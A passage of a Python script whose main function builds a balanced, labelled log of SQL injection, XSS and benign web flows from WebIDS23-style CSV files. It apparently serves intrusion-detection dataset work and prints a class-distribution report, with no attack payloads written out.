    return allocations


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--sqli-http", type=Path)
    ap.add_argument("--sqli-https", type=Path)
    ap.add_argument("--xss-http", type=Path)
    ap.add_argument("--xss-https", type=Path)
    ap.add_argument("--benign", type=Path)
    ap.add_argument("--strategy", choices=["match_min", "match_max", "custom"], default="match_min")
    ap.add_argument("--custom-sqli-count", type=int)
    ap.add_argument("--custom-xss-count", type=int)
    ap.add_argument("--benign-ratio", type=float, default=1.0)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--obfuscate-prob", type=float, default=0.4)
    ap.add_argument("-o", "--output", type=Path, default=Path("honeypot_from_webids23.log"))
    args = ap.parse_args()

    t0 = time.time()

    sqli_files = [(p, k) for p, k in
                  [(args.sqli_http, "sqli_http"), (args.sqli_https, "sqli_https")] if p]
    xss_files = [(p, k) for p, k in
                 [(args.xss_http, "xss_http"), (args.xss_https, "xss_https")] if p]

    if not sqli_files and not xss_files and not args.benign:
        sys.exit("No input CSVs given. See --help.")

    print("Counting natural row counts...")
    sqli_counted = [(p, k, count_rows(p)) for p, k in sqli_files]
    xss_counted = [(p, k, count_rows(p)) for p, k in xss_files]
    sqli_natural = sum(c for _, _, c in sqli_counted)
    xss_natural = sum(c for _, _, c in xss_counted)
    print(f"  SQLi natural total: {sqli_natural}")
    print(f"  XSS natural total:  {xss_natural}")

    if args.strategy == "match_min":
        sqli_target = xss_target = min(sqli_natural, xss_natural) if (sqli_natural and xss_natural) else max(sqli_natural, xss_natural)
    elif args.strategy == "match_max":
        sqli_target = xss_target = max(sqli_natural, xss_natural)
    else:
        sqli_target = args.custom_sqli_count if args.custom_sqli_count is not None else sqli_natural
        xss_target = args.custom_xss_count if args.custom_xss_count is not None else xss_natural

    benign_target = round(args.benign_ratio * (sqli_target + xss_target))
    print(f"Targets -> SQLi: {sqli_target} | XSS: {xss_target} | Benign: {benign_target} "
          f"(strategy={args.strategy}, benign_ratio={args.benign_ratio})")

    sqli_alloc = allocate(sqli_counted, sqli_target) if sqli_counted else []
    xss_alloc = allocate(xss_counted, xss_target) if xss_counted else []

    stats = Counter()
    seen_sqli, seen_xss, seen_benign = set(), set(), set()
    with open(args.output, "w", encoding="utf-8") as out:
        for path, kind, natural, target in sqli_alloc:
            if target <= 0:
                continue
            rows = reservoir_sample(path, min(target, natural) if natural else target, args.seed)
            write_rows(rows, kind, out, args.seed, args.obfuscate_prob, target, stats, seen_sqli)
            print(f"[ok] {kind}: {target} entries ({len(rows)} unique flows + "
                  f"{max(target-len(rows),0)} oversampled) from {path.name}")

        for path, kind, natural, target in xss_alloc:
            if target <= 0:
                continue
            rows = reservoir_sample(path, min(target, natural) if natural else target, args.seed)
            write_rows(rows, kind, out, args.seed, args.obfuscate_prob, target, stats, seen_xss)
            print(f"[ok] {kind}: {target} entries ({len(rows)} unique flows + "
                  f"{max(target-len(rows),0)} oversampled) from {path.name}")

        if args.benign and benign_target > 0:
            benign_natural = count_rows(args.benign)
            rows = reservoir_sample(args.benign, min(benign_target, benign_natural), args.seed)
            write_rows(rows, "benign", out, args.seed, args.obfuscate_prob, benign_target, stats, seen_benign)
            print(f"[ok] benign: {benign_target} entries ({len(rows)} unique flows + "
                  f"{max(benign_target-len(rows),0)} oversampled) from {args.benign.name}")

    elapsed = time.time() - t0
    peak_mb = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024

    print(f"\n=== Distribution report ===")
    print(f"Total entries: {stats['total']}")
    print(f"label=1 (attack): {stats['label_1']}  |  label=0 (benign): {stats['label_0']}")
    if stats['total']:
        print(f"malicious:benign ratio = {stats['label_1']}:{stats['label_0']} "
              f"({stats['label_1']/max(stats['label_0'],1):.2f}:1)")
    print("attack_family breakdown:")
    for fam, n in sorted(stats.items()):
        if fam.startswith("family_"):
            print(f"  {fam[7:]:>16}: {n}")
    print(f"flow-level (oversampled) duplicates: {stats['duplicate']} "
          f"({stats['duplicate']/max(stats['total'],1)*100:.1f}% of total)")
    print(f"forced-unique-nonce fallback fired: {stats['forced_nonce']} times "
          f"({stats['forced_nonce']/max(stats['total'],1)*100:.2f}% of total)")
    print(f"distinct attack payload strings: SQLi={len(seen_sqli)}  XSS={len(seen_xss)}")
    print(f"distinct benign payload values: {len(seen_benign)}")
    print(f"\nOutput: {args.output}")
    print(f"Elapsed: {elapsed:.1f}s | Peak RSS: {peak_mb:.0f} MB")


if __name__ == "__main__":
    main()
